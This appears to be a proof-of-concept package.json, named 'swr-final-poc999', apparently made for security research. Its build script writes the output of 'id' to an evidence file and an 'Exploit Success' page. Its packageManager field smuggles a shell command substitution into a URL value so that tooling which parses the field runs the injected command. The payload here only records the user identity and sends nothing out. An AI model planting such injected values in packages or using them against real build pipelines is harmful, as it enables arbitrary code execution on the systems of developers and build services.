{
  "name": "swr-final-poc999",
  "version": "1.0.0",
  "scripts": {
    "build": "mkdir -p public && id > public/evidence.txt && echo 'Exploit Success' > public/index.html"
  },
  "packageManager": "pnpm@https://x.com/$(mkdir -p public;id>public/evidence.txt)"
}
